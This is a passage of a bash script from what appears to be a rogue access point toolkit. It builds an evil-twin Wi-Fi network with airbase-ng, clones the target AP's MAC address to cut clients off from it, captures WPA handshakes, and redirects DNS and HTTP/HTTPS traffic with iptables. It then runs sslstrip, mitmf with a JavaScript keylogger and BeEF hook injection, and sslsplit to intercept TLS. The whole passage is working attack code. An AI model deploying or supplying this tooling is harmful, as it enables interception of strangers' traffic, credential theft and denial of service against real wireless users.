	1) echo -e "$q\n  RogueAP IP Address?$txtrst"
	read ap_ip
	ap_setup_fn;;
	
	2) echo -e "$q\n  RogueAP Subnet Mask?$txtrst"
	read ap_sm
	ap_setup_fn;;
	
	3) echo -e "$info    Selection of the RogueAP Channel is dependent on the"
	echo -e "$info  DDOS operation conducted and equipment available."
	echo ""
	echo -e "$info     a.  If you do not wish to DDOS the TargetAP then set any channel."
        echo -e "$info     b.  If you wish to DDOS the TargetAP and have only one(1) wifi"
 	echo -e "$info         device in monitor mode then the RogueAP MUST be set to the"
	echo -e "$info         TargetAPs' channel. The TargetAPs' channel is currently$yel $tarchan$info."
	echo -e "$info     c.  If a second wifi device in monitor mode is available to conduct the"
	echo -e "$info         DDOS then set the channel at least three(3) wifi channel numbers"
	echo -e "$info         away from the TargetAP to avoid having the DDOS operation."
        echo -e "$info         affect the RogueAP. In this case a mdk3 g WPA Downgrade attack"
	echo -e "$info         thru a terminal window could be used."
	echo ""

	           echo -e "$q\n  Enter RogueAP Channel?$txtrst"


		read apchan
		case $apchan in
			[1-9]|1[0-4]) ;;
			*) apchan= ;; 
		esac
		ap_setup_fn;;
	
		4) echo -e "$q\nDesired MTU Size?$txrst"
		read mtu_size
		if [[ $mtu_size -lt 42 || $mtu_size -gt 6122 ]];then
		mtu_size=
        fi
		ap_setup_fn;;
		
		5) echo -e "$q\n  Encryption type?
			Open
			WEP40
			WEP104
			WPA (for handshake grabbing only)
			WPA2 (for handshake grabbing only)$txtrst"
		read encrypt
		if [[ $encrypt = "Open" ]];then
			Z=
		elif [[ $encrypt = "WEP40" ]];then
			echo -e "$q\n  Enter password (10 character hexadecimal)$txtrst"
			read WEPpswd
			# error check password
			if [[ $(echo $WEPpswd | wc -m) != 11 ]];then # wc counts the return, therefore 11 not 10
				echo -e "$warn\nInvalid password$txtrst"
				sleep 2
				WEPpswd=
				encrypt=
				ap_setup_fn
			else
				Z="-w "$WEPpswd""	# safer to quote the password so there isn't unpredictable expansion ###check this quoting works. brackets instead?
			fi
		elif [[ $encrypt = "WEP104" ]];then
			echo -e "$q\nEnter password (26 character hexadecimal)$txrst"
			read WEPpswd
			# error check password
			if [[ $(echo $WEPpswd|wc -m) != 27 ]];then # counts return, therefore 27 not 26
				echo -e "$warn\nInvalid password$txtrst"
				sleep 1
				WEPpswd=
				encrypt=
				ap_setup_fn
			else
				Z="-w "$WEPpswd""		# -w sets WEP password
			fi
		elif [[ $encrypt = "WPA" ]];then
			Z="-z 2 -W 1 -F PwnSTAR"    # -W sets WEP flag (see man airbase-ng), z 2 means WPA
		elif [[ $encrypt = "WPA2" ]];then
			Z="-Z 4 -W 1 -F PwnSTAR"
		elif [[ $encrypt = * ]];then
			echo -e "$warn\nInvalid selection"
			sleep 1
            encrypt=
		fi
		ap_setup_fn;;
        
		c|C) if [[ -z $ap_ip || -z $ap_sm || -z $apchan || -z $mtu_size || -z $encrypt ]];then # check all variables are set
			echo -e "$warn\nNot so fast, all fields must be filled before proceeding"
			sleep 2
			ap_setup_fn
			fi;;
            
        *) ap_setup_fn;;
	
	esac
}

ap_type_fn()
{




	BB= # nulled; if this is repeat run-through, BB would exist, and the while loop would not trigger 
	while [ -z $BB ];do

	clear

echo -e "$txtrst"
echo -e "$bold$info  RogueAP Response to Probes"
echo -e "$warn  __________________________$norm"
echo ""

	echo ""
		echo -e "$q 

Choose the \033[4mtype\033[0m\033[1;32m of RogueAP to establish: 

    $inp 1$yel)$info Blackhole$yel-->$q Responds to All probe requests

    $inp 2$yel)$info Bullzeye$yel-->$q Broadcasts only the specified ESSID(i.e. AP name)

    $inp 3$yel)$info Both$yel-->$q Responds to all, otherwise broadcasts specified\n $txtrst"
		
    read BB
	done

	case $BB in
		[1-3]) ;;
		*) ap_type_fn;;
	esac
}

ap_start_fn()
{
	if [[ $internet = y ]];then
		# forward at0 to the internet
		iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE
	fi

	# blackhole targets every probe request
	if [ $BB == "1" ]; then

#		Eterm -g 80x12-0+0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Blackhole AP" -e airbase-ng $Z -c $apchan -P -C 60 -v $monap 2> /dev/null 2> /dev/null &

#		if [[ $tarchan == $apchan ]]; then

		xterm -g 80x10-0+0 -T "Blackhole AP" -e airbase-ng $Z -c $apchan -P -C 60 -v $monap 2> /dev/null 2> /dev/null &

#				fi

#		if [[ $tarchan != $apchan ]] && [[ $use2dos == n || $use2dos == N ]]; then

#		xterm -g 80x10-0+0 -T "Blackhole AP" -e airbase-ng $Z -c $apchan -P -C 60 -v $monap 2> /dev/null 2> /dev/null &

#				fi


#		if [[ $tarchan != $apchan ]] && [[ $use2dos == n || $use2dos == Y ]]; then

#		xterm -g 80x10-0+0 -T "Blackhole AP" -e airbase-ng $Z -c $tarchan -P -C 60 -v $twomon 2> /dev/null 2> /dev/null &

#				fi



		clear
		
	# bullzeye broadcasts specified ESSID only

####################
SSID=ZZZ

sleep .5
	elif [ $BB == "2" ] || [ $BB == "3" ] ; then

		while [ -z $SSID ];do

		clear

#		if [ ! -z $ESSIDAVAIL ]; then

		echo "$ESSIDAVAIL" | sed 's/^/       /'

#			fi

		echo ""
		echo -e "$bold$info  Selection of ESSID(i.e. Name of RogueAP)"
		echo -e "$warn  ________________________________________"
		echo -e "$norm"
		echo -e "$info             $undr WPA Phishing Special Considerations $norm"
		echo ""
		echo -e "$info     If WPA Phishing$yel DONOT$info enter the exact same name" 
		echo -e "$info  as the targetAP. Enter 5 to 8 spaces and then a period or"
		echo -e "$info  dot after the name of targetAP. See help files for concepts"
		echo -e "$info  and details."

#		if [ ! -z  $ESSIDAVAIL ]; then

		echo -e "$info     A list of networks will be seen above."
		echo -e "$info  Use the mouse to copy, paste and then alter as required."
#			fi

		echo -e "$info"
		echo""
		if [ ! -z  $tarbssid ]; then

		echo -e "$info     For reference the current targetAP bssid = $yel$tarbssid$info."
			fi

		echo -e "$q\n  Enter the desired ESSID(i.e. Name of RogueAP)?"

		echo -e "$info  Name with spaces $undr$yel DOESNOT $norm$info require parenthesis surrounding name.$txtrst"
			read SSID
			echo "$SSID" > /tmp/essidlist
			
		done

		if  [ $BB == "2" ]; then
#		Eterm -g 80x10-0+0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Bullzeye AP $SSID" -e airbase-ng $Z -c $apchan -e "$SSID" -v $monap 2> /dev/null &

		xterm -g 80x12-0+0 -T "Bullzeye AP $SSID" -e airbase-ng $Z -c $apchan --essids /tmp/essidlist -v $monap 2> /dev/null &

			fi


		clear
		
	# both
	if [ $BB == "3" ];then 
#		while  [ -z "$SSID" ];do
#			echo -e "$q\n  Desired ESSID eg Free Public WiFi?"
#			echo -e "$info    Names with spaces do not require parenthesis surrounding the name.$txtrst"
#			read SSID
#			echo "$SSID" > /tmp/essidlist
#		done

#		Eterm -g 80x12-0+0 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Both AP $SSID" -e airbase-ng $Z -c $apchan -e "$SSID" -P -C 60 -v $monap 2> /dev/null &

		xterm -g 80x10-0+0 -T "Both AP $SSID" -e airbase-ng $Z -c $apchan --essids /tmp/essidlist -P -C 60 -v $monap 2> /dev/null &

		clear
	fi

		fi

#	if [[ $apchan == $tarchan ]]; then

		if [[ $apusage = a ]]; then # Move xterm to side if dns not used

xterm -g xterm -g 80x10+60+373 -T "Airodump-ng Monitor RogueAP" -e airodump-ng -c $apchan -w HANDSHAKEHOLD/$tarbssid $monap 2> /dev/null &

			else

xterm -g xterm -g 80x10+60+400 -T "Airodump-ng Monitor RogueAP" -e airodump-ng -c $apchan -w HANDSHAKEHOLD/$tarbssid $monap 2> /dev/null &

				fi

#			fi

#######################################Make More SSID Broadcast

	echo -e "$info\n  OK, We're finally starting RogueAP thru airbase-ng..."
	sleep 6 # for at0 to be started - crucial
	modprobe tun 		# probably not necessary
	ifconfig at0 up $ap_ip netmask $ap_sm
	ifconfig at0 mtu $mtu_size


#        if [[ $apusage == 3 ]] || [[ $apusage == a ]]; then
		
#	sleep 1
#	DNSRESPOND_fn
#	echo -e "     Starting DNS Response Test"
#	echo -e " An active DNS connection to internet required"
#	echo -e " for phishing pages to function"
#	sleep 3

#		fi


ap_clones_fn()

{

     if [[ $BB == "2" ]] && [[ ! -z $tarbssid ]]; then

SETCLONETEST=ZZZ

until  [[ $SETCLONETEST == y ]] || [[ $SETCLONETEST == Y ]]; do

clear
echo -e ""
echo -e "$bold$info  WPA Phishing Advanced Setups and DDOS"
echo -e "$warn  _____________________________________$norm"
echo ""
echo -e "$info     You can construct a second WPA encrypted RogueAP Clone"
echo -e "$info  This clone is setup to request a WPA key when a client tries to connect"
echo -e "$info  but cannot actually accept association. If the same mac address(bssid)"
echo -e "$info  AP Name(essid) and channel as the targetAP is used, this Rogue AP Clone"
echo -e "$info  can mask the targetAP, making association impossible. The DDOS approach"
echo -e "$info  is passive in contrast to an active DDOS using mdk3. Its success is"
echo -e "$info  dependent on relative signal strengths between RogueAP and TargetAP"
echo -e "$info  respect the client." 
echo -e ""
echo -e "$q     Do you wish to setup a second RogueAP clone to DDOS the TargetAP?"
echo ""
echo -e "$inp     Press$yel (y/Y)$inp to setup a clone."
echo -e "$inp  Enter$yel (n/N)$inp to not use this feature.$txtrst"
read SETCLONE

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$SETCLONE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read SETCLONETEST

	case $SETCLONETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done


	if [[ $SETCLONE != y ]] && [[ $SETCLONE != Y ]] && [[ $SETCLONE != n ]] && [[ $SETCLONE != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	SETCLONETEST=ZZZ

	fi #n

		done

		fi  #bb2

if [[ $SETCLONE == y ]] || [[ $SETCLONE == Y ]]; then

SSIDCLONETEST=ZZZ

until  [[ $SSIDCLONETEST == y ]] || [[ $SSIDCLONETEST == Y ]]; do

clear

		echo "$ESSIDAVAIL" | sed 's/^/       /'

echo -e ""
echo -e "$bold$info  Entering RogueAP Clones ESSID"
echo -e "$warn  _____________________________$warn"
echo ""
echo -e "$info     Enter the$yel$undr Exact Same Name $norm$info as the TargetAP"
echo -e "$warn  DO NOT add spaces or alter the ESSID in any way."


		echo -e "$info     A list of ESSIDs found during airodump-ng scan is seen"
		echo -e "$info  above. Use the mouse to copy, and paste as required."

echo ""
echo -e "$inp    $warn Important$inp Enter the targetAPs exact same name below; $txtrst"
read SSIDCLONE
               

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$SSIDCLONE$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read SSIDCLONETEST

	case $SSIDCLONETEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"
 
	done

		done

echo -e "$txtrst     Setting the RogueAP Clone mac address to the TargetAP mac address."
 
	if [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

		echo -e "$txtrst"
		ifconfig $use2dos down
		iwconfig $use2dos mode managed
		ifconfig $use2dos up

		echo -e "  Changing $use2dos to mac address of targetAP $tarbssid"
		ifconfig $use2dos down &> /dev/null
		sleep .1
		macchanger -m $tarbssid $use2dos
		sleep 3  # Need time for device complete op 
		ifconfig $use2dos up
		sleep .1

		if [[ $ifselect == old ]]; then

            VARMACROG=$(ifconfig $use2dos | awk '{print $5}')
            sleep 0.5
            VARMACROG=$(echo $VARMACROG | awk '{print $1}')

		fi #n

		if [[ $ifselect == new ]]; then

VARMACROG=$(ifconfig $use2dos | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi #n

		echo -e "$txtrst"
		echo -e "$info\n Placing $use2dos in mode manage to change mac address $txtrst"
		ifconfig $use2dos down
		sleep .1
		iwconfig $use2dos mode manage &> /dev/null
		sleep .1
		ifconfig $use2dos up
		sleep .1
		ifconfig $monscan down
		sleep .1
		macchanger -m $VARMACROG $monscan
		sleep 2 # Need time to complete op
		ifconfig $monscan up
		sleep .1
		ifconfig $use2dos down
		sleep .1
		iwconfig $use2dos mode monitor
		sleep .1
		ifconfig $use2dos up

			fi #[[ $use2nd == y ]]

	RAND4=$(cat /dev/urandom | tr -dC '[:graph:] [:cntrl:] [:punct:]' | head -c 4)
	echo "$SSIDCLONE" > /tmp/essidlist1
	sleep 1
	
	if [[ ! -z $tarchan ]]; then

		xterm -g 80x10+60+0 -T "WPA Rogue Clone $SSIDCLONE" -e airbase-ng -c $tarchan --essids /tmp/essidlist1 -Z 4 -W 1 -v $monscan 2> /dev/null &

		fi

			fi #[[ $SETCLONE == y


}

ap_clones_fn



	if [[ $SETCLONE == y ]] || [[ $SETCLONE == Y ]];then

	echo -e "$info\n  OK, We're finally starting RogueAP clone thru airbase-ng..."
	sleep 3

			fi
	
#	echo -e "$info\n  OK, We're finally starting airbase-ng..."
#	sleep 6 # for at0 to be started - crucial
#	modprobe tun 		# probably not necessary
#	ifconfig at0 up $ap_ip netmask $ap_sm
#	ifconfig at0 mtu $mtu_size

}

# ~~~~~~~~~~ DHCP Functions ~~~~~~~~~~ #

dhcp_presets_fn()
{
apnet="192.168.0.0" 		    		# DHCP Subnet 
aprange="192.168.0.100 192.168.0.200" 	# DHCP IP range
}

dhcp_setup_fn()
{
clear
echo -e "$def

Check DHCP Server Parameters:


    $inp 1$yel)$info Gateway IP Address  \e[1;36m[$ap_ip]
$def
    $inp 2$yel)$info Subnet Mask         \e[1;36m[$ap_sm]
$def
    $inp 3$yel)$info Subnet              \e[1;36m[$apnet]
$def
    $inp 4$yel)$info IP Range            \e[1;36m[$aprange]
$def
    $inp C$yel)$info Continue

\n"
read var
case $var in

	1) echo -e "\033[36m\nGateway IP Address?$txrst"
	read ap_ip
	dhcp_setup_fn;;

	2) echo -e "\033[36m\nSubnet Mask?$txtrst"
	read ap_sm
	dhcp_setup_fn;;

	3) echo -e "\033[36m\nSubnet?$txtrst"
	read apnet
	dhcp_setup_fn;;

	4) echo -e "\033[36m\nIP Range?$txtrst"
	read aprange	
	dhcp_setup_fn;;

	c|C) if [[ -z $ap_ip || -z $ap_sm || -z $apnet || -z $aprange ]];then
		echo -e "\033[31mGet a grip - you've missed something"
		sleep 1
		dhcp_setup_fn
		fi;;

	*) 	dhcp_setup_fn;;
esac
}

dhcp_start_fn()
{
	echo > /var/lib/dhcp/dhcpd.leases  # Clear any pre-existing dhcp leases
	cat /dev/null > /tmp/dhcpd.conf
    
    # need a working nameserver from our internet connection
    var=$(grep "nameserver" /etc/resolv.conf | awk '{print $2}' |wc -l) # count the number of nameservers in resolv.conf
    if [[ $var = 1 ]];then  # if 1, use it in dhcpd.conf
        apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}')
    elif [[ $var > 1 ]];then  # if more than 1 nameserver, manipulate string into an acceptable form for dhcpd.conf

        apdns=$(grep nameserver /etc/resolv.conf | awk '{print $2}' | tr '\n' ',') # replace newlines with commas
        apdns=${apdns//,/", "}                           # add a space after all commas
        apdns=${apdns%", "}

                              # delete the final comma/space
    else apdns=$ap_ip # default in case resolv.conf is empty, which would prevent dhcpd starting

        sleep 3
    fi

	echo -e "$info\nGenerating /tmp/dhcpd.conf"
	echo -e "$info\nStarting DHCP server..."
	echo "default-lease-time 300;"> /tmp/dhcpd.conf
	echo "max-lease-time 360;" >> /tmp/dhcpd.conf
	echo "ddns-update-style none;" >> /tmp/dhcpd.conf
	echo "authoritative;" >> /tmp/dhcpd.conf
	echo "log-facility local7;" >> /tmp/dhcpd.conf
	echo "subnet $apnet netmask $ap_sm {" >> /tmp/dhcpd.conf
	echo "range $aprange;" >> /tmp/dhcpd.conf
	echo "option routers $ap_ip;" >> /tmp/dhcpd.conf
        echo "option domain-name-servers $apdns;" >> /tmp/dhcpd.conf
	echo "}"  >> /tmp/dhcpd.conf
	echo "apdns=$apdns"
	# mkdir -p /var/run/dhcpd && chown dhcpd:dhcpd /var/run/dhcpd # not required in Kali/isc-dhcpd
	dhcpd -cf /tmp/dhcpd.conf & #-pf /var/run/dhcpd/dhcpd.pid at0 &
	route add -net $apnet netmask $ap_sm gw $ap_ip
	iptables -P FORWARD ACCEPT  # probably not necessary 'coz we flushed the chains earlier
##############Musket Team#################################
   if [[ $apusage = 4  &&  $internet = y ]]; then

	iptables -t nat -A PREROUTING -i at0 -j REDIRECT	### ???helps to avoid DNS cache. Still a problem sometimes.

    echo "  GIVING INTERNET ACCESS"
    sleep 3

##iptables -t nat -A PREROUTING -i at0 -j REDIRECT

#		iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE

#iptables --append FORWARD --in-interface at0 -j ACCEPT
#echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables -t nat -A PREROUTING -p udp --dport 80 -j DNAT --to-destination $apdns:80
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $apdns:80
#iptables -t nat -A PREROUTING -p udp --dport 443 -j DNAT --to-destination $apdns:443
#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $apdns:443

#echo 1 > /proc/sys/net/ipv4/ip_forward
#iptables -t nat -A POSTROUTING -o $ICI -j MASQUERADE
#iptables -t nat -A POSTROUTING -j MASQUERADE

   fi

sleep 3		# for dhcpd to start
###########
##iptables --table nat --append POSTROUTING --out-interface $ICI -j MASQUERADE 
##iptables --append FORWARD --in-interface at0 -j ACCEPT
##echo 1 > /proc/sys/net/ipv4/ip_forward
# << $IPINTDEV variable sets ip assigned to device when internet access obtained >>
# << Note the :80 is the port and should not be changed >>
##iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to $apdns:80
##iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $apdns:80
#iptables -t nat -A POSTROUTING -p tcp --dport 80 -j DNAT --to $apdns:80
#iptables -t nat -A POSTROUTING -p udp --dport 80 -j DNAT --to $apdns:80
##iptables -t nat -A POSTROUTING -j MASQUERADE

########################

    if [[ $apusage = 4 && $internet = n ]]; then
#        iptables -t nat -A PREROUTING -i at0 -j REDIRECT	### ???helps to avoid DNS cache. Still a problem sometimes.
#     iptables -t nat -A PREROUTING -i at0 -j ACCEPT	### ???helps to avoid DNS cache. Still a problem sometimes.
echo "Not giving internet access"
sleep 3
#iptables -t nat -A PREROUTING -i at0 -p udp --destination-port 53 -j REDIRECT

iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 127.0.0.1

iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 127.0.0.1

#iptables -t nat -A PREROUTING -s 192.168.0.100/24 -p udp --dport 53 -j DNAT --to-destination 127.0.0.1
#iptables -t nat -A PREROUTING -s 192.168.0.100/24 -p tcp --dport 53 -j DNAT --to-destination 127.0.0.1
iptables --table nat --append POSTROUTING --out-interface $API -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT

    fi

#########End Musket Team adds #######################3333

	sleep 3		# for dhcpd to start
	
	# tail leases

#	Eterm -g 80x8-0+225 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 -r --font-fx none --buttonbar 0  --scrollbar 0 -q -T "DHCP Server Tail" -e tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null &

	xterm -g 80x8-0+225 -T "DHCP Server Tail" -e tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null &

    echo -e "$info\n\nSoft AP is now running :-)"
    echo -e "$info     Ignore any unrecognized file system warning in the xterm window"
    echo -e "$info  It will not effect the program."
    sleep 5
    clear
}

# ~~~~~~~~~~ Sniffing Functions ~~~~~~~~~~ #

sniff_fn()
{
	echo ""
	echo -e "$warn\n  Check internet is connected on $ICI"
	sleep 1
	# Ferret
	echo -e "$info     You can run ferret with sslstrip+"

ferret=ZZZ

until [[ $ferret == y ]] || [[ $ferret == n ]]; do

	echo ""
	echo -e "$q\n  Start ferret on at0?$yel (y/n)$txtrst"
	read ferret

	if [[ $ferret != y ]] && [[ $ferret != n ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/n)$warn ONLY - try again!!!"
	sleep 3

		fi

			done

#	echo -e "$q\nStart ferret on at0?$yel (y/n)$txtrst"
#	read ferret

	if [[ $ferret = y ]];then

#        Eterm -g 80x14-0+373 --cmod "red" --pointer-color "dark orange" -f DarkOrchid4 -b LightYellow1 --font-fx none --buttonbar 0  --scrollbar 0 -q -T "Ferret" -e ferret -i at0 --channel $apchan 2> /dev/null & 

        xterm -g 80x14-0+373 -T "Ferret" -e ferret -i at0 --channel $apchan 2> /dev/null & 

        sleep 1

    elif [[ $ferret != n ]]  && [[ $ferret != y ]] ;then
        echo -e "$warn\n  What's it gunna be babe...yes or no?"
        sleep 2 
        sniff_fn
	fi
    
	# SSLStrip+ thru mitmf

sslstriptype_fn()
{

if [[ -x /etc/mitmf ]]; then

# keep old sslstrip so usb users have sslstrip

sslstrip=ZZZ

until [ $sslstrip == 1 ] || [ $sslstrip == 2 ] || [ $sslstrip == c ] || [ $sslstrip == C ]; do

clear
echo ""
echo -e "$bold$info  SSLSLIP and SSLSLIP+"
echo -e "$warn  ____________________$norm"

	echo ""
	echo -e "$inp     Users of persistant usb installs of kali-linux maynot"
	echo -e "  be able to use mitmf/sslslip+ due to install problems"
	echo -e "  Data will be written to a timestamped log in /root/SSLSTRIP_LOGS"

        echo -e "$inp     Select$yel(1)$inp to run sslstrip"
        echo -e "$inp  Choose $yel(2)$inp to run sslstrip+"
	echo -e "$inp  Enter $yel(c/C)$inp to skip this feature$txtrst"
	read sslstrip

	if [[ $sslstrip != 1 ]] && [[ $sslstrip != 2 ]] && [[ $sslstrip != c ]] && [[ $sslstrip != C ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(1, 2, c or C)$warn ONLY - try again!!!"
	sleep 3

		fi

			done

	if [[ $sslstrip == 2 ]]; then 

ssluse=ZZZ

until [[ $ssluse == y ]] || [[ $ssluse == Y ]] || [[ $ssluse == n ]] || [[ $ssluse == N ]]; do
                
	if [[ -x /etc/mitmf ]]; then

		clear
		echo ""
		echo -e "$bold$info  Use mitmf sslstrip+"
		echo -e "$warn  ___________________$norm"
		echo ""
		echo -e "$q     Do you wish to run mitmf/sslslip+?"
		echo "" 
		echo -e "$info  Most mitmf features function in http requests"
		echo -e "$info  only. All Data is written to a xterm window "
		echo -e "$info  and to /root/SSLSTRIP_LOGS/ in text format."
		echo ""    
		echo -e "$inp     Enter $yel(y/Y)$inp to run mitmf with selected features."  
		echo -e "$inp  Choose $yel(n/N)$inp to skip this feature.$txtrst"
		read ssluse

		fi

if [[ $ssluse != y ]] && [[ $ssluse != Y ]] && [[ $ssluse != n ]] && [[ $ssluse != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y or n/N)$warn ONLY - try again!!!"
	sleep 3

		fi

			done

	fi

	fi

}

sslstriptype_fn

if [[ $sslstrip == 1 ]] || [[ $sslstrip == 2 ]]; then

		DATEFILE=$(date +%y%m%d-%H:%M)

		if [ ! -d "/root/SSLSTRIP_LOGS" ]; then

		    mkdir -p -m 700 /root/SSLSTRIP_LOGS;

			fi

	if [[ $sslstrip == 1 || $sslstrip == 2 ]] && [[ $apusage == a || $apusage == b ]];then
#	if [[ $sslstrip == 1 || $sslstrip == 1 ]] && [[ $apusage == a || $apusage == b ]];then
#        if [[ $apusage = a || $apusage = b ]];then  # captive portal with some iptables rules already set

#           echo "y" > /tmp/sslstrip    # stores $sslstrip
            sleep 0.5
            mac=$(cat /tmp/ip/ip)
            iptables -t nat -I PREROUTING -p tcp --destination-port 80 -m mac --mac-source $mac -j REDIRECT --to-port 10000 2> /dev/null & 
            # iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 ###
        else                        # standard sslstrip rule
            iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000


        fi

		if [[ $sslstrip == 1 ]]; then

xterm -g 80x10+60+200 -T "sslstrip" -e " sslstrip -a -k -f -w /root/SSLSTRIP_LOGS/sslstrip-$DATEFILE" &		
#		sslstrip -k -f 2> /dev/null & 

			fi

#		if [[ $sslstrip == 2 ]]; then

#       xterm -g 100x20-0-0 -T "airodump-ng scan" -e "airodump-ng "$monscan"  2>&1 | tee /tmp/airocap.txt" &



mitmf_fn()
{


if [[ $ssluse == y ]] || [[ $ssluse == Y ]]; then

		echo ""
		echo -e "$bold$info  Use mitmf/sslstrip+ features"
		echo -e "$warn       ____________________________$norm"
		echo ""
		echo "" 
		echo -e "$inp  Enter$bold$yel (1)$norm$info to run mitmf with jskeylogger."
		echo -e "$inp  Enter$bold$yel (2)$norm$info to run mitmf with jskeylogger and upside-down internet."
		echo -e "$inp  To continue without mitmf select$bold$yel (c/C)$info."

		read mitmfsel

                if [[ $mitmfsel == 1 ]]; then

xterm -g 80x10+60+200 -T "mitmf sslstrip+ jskeylogger" -e "mitmf -i at0 -l 10000 --spoof --jskeylogger --hsts --arp --dns --gateway $apdns --target $ap_ip 2>&1 | tee -i /root/SSLSTRIP_LOGS/sslstripplus-$DATEFILE" & mitmfpid=$!

		fi

#upsidedown

		if [[ $mitmfsel == 2 ]]; then

xterm -g 80x10+60+200 -T "mitmf sslstrip+ jskeylogger Upside" -e "mitmf -i at0 -l 10000 --spoof --jskeylogger --upsidedownternet --hsts --arp --dns --gateway $apdns --target $ap_ip 2>&1 | tee -i /root/SSLSTRIP_LOGS/sslstripplus-$DATEFILE" & mitmfpid=$!


		fi


		if [[ $mitmfsel == 3 ]]; then


xterm -g 80x10+60+200 -T "mitmf sslstrip+ js-url" -e "mitmf -i at0 -l 10000 --spoof --jskeylogger --hsts --arp --dns --gateway $apdns --target  $ap_ip --inject --js-url http://192.168.0.1:3000/hook.js  2>&1 | tee -i /root/SSLSTRIP_LOGS/sslstripplus-$DATEFILE" & mitmfpid=$!


#xterm -g 80x20-0+0 -T "beef" -e "cd /usr/share/beef-xss; ./beef;" &

#xterm -g 80x20-0+0 -T "beef" -e "cd /usr/share/beef-xss; ./beef 2>&1 | tee -i /root/SSLSTRIP_LOGS/beef" & beeffpid=$!

		fi

#xterm -g 80x10+60+200 -T "mitmf sslstrip+ jskeylogger" -e "mitmf -i at0 -l 10000 --spoof --hta --text Test --jskeylogger --hsts --arp --dns --gateway $apdns --target $ap_ip 2>&1 | tee -i /root/SSLSTRIP_LOGS/sslstripplus-$DATEFILE" &

                if [[ $mitmfsel != 1 ]] && [[ $mitmfsel != 2 ]] && [[ $mitmfsel != 3 ]] && [[ $mitmfsel != c ]] && [[ $mitmfsel != C ]]; then

		echo "" 
		echo -e "$bold$yel!!!$warn Enter  1, 2, c or C ONLY$yel!!!$norm"
		sleep 3
		mitmf_fn

		fi

			fi

}		


	if [[  $sslstrip == 2 ]]; then

		mitmf_fn


			fi

sslsplit_fn()
{

	if [[ -x /usr/bin/sslsplit ]]; then







splituse=ZZZ

until [[ $splituse == y ]] || [[ $plituse == Y ]] || [[ $splituse == n ]] || [[ $splituse == N ]]; do
                
	if [[ -x /usr/bin/sslsplit ]]; then

		clear
		echo ""
		echo -e "$bold$info  Use sslsplit"
		echo -e "$warn  _____________$norm"
		echo ""
		echo -e "$q     Do you wish to run sslsplit?"
		echo "" 
		echo -e "$info       Sslsplit uses a self-signed CA private key"
		echo -e "$info  This will set-off a warning in google and other"
		echo -e "$info  sites that it cannot be trusted"
		echo -e "$info  Data is written to a xterm window "
		echo -e "$info  and to /root/SSLSLIP_LOGS/ in text format."
		echo ""    
		echo -e "$inp     Enter $yel(y/Y)$inp to run sslsplit."  
		echo -e "$inp  Choose $yel(n/N)$inp to skip this peogram.$txtrst"
		read splituse

		fi

if [[ $splituse != y ]] && [[ $splituse != Y ]] && [[ $splituse != n ]] && [[ $splituse != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y or n/N)$warn ONLY - try again!!!"
	sleep 3

	fi

	done


if [[ $splituse == y ]] || [[ $splituse == Y ]]; then


		if [ ! -d "/root/SSLSPLIT_LOGS" ]; then

		    mkdir -p -m 700 /root/SSLSPLIT_LOGS;

			fi


# send sslsplit data to ports

	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080
	iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 8443
	iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-ports 8443
	iptables -t nat -A PREROUTING -p tcp --destination-port 465 -j REDIRECT --to-ports 8443
	iptables -t nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports 8443
	iptables -t nat -A PREROUTING -p tcp --destination-port 5222 -j REDIRECT --to-ports 8080

sleep 2

#xterm -g 80x20-0+0 -T "beef" -e "cd /usr/share/beef-xss; ./beef 2>&1 | tee -i /root/SSLSTRIP_LOGS/beef" & beeffpid=$!

#DATEFILE=$(date +%y%m%d-%H:%M)

sleep 2

xterm -g 80x20-0+0 -T "sslsplit" -e "sslsplit -D -l /root/SSLSPLIT_LOGS/connections.log -j /root/SSLSPLIT_LOGS -S /root/SSLSPLIT_LOGS -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080" & splitpid=$!

